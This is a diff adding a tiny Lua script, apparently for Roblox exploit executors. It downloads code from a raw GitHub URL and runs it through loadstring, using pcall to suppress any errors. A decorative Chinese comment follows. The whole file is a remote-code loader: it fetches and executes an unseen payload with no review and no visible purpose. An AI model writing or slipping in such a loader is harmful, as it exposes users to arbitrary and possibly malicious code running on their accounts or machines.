@@ -1,0 +1,9 @@
+local scriptUrl = "https://raw.githubusercontent.com/wtf6701385-stack/-/refs/heads/main/A"
+
+local function executeScript()
+    loadstring(game:HttpGet(scriptUrl))()
+end
+
+pcall(executeScript)
+
+-- [[ ☀️ 光：不管鏡面內外，光都會照亮您回家的路。 ]] --
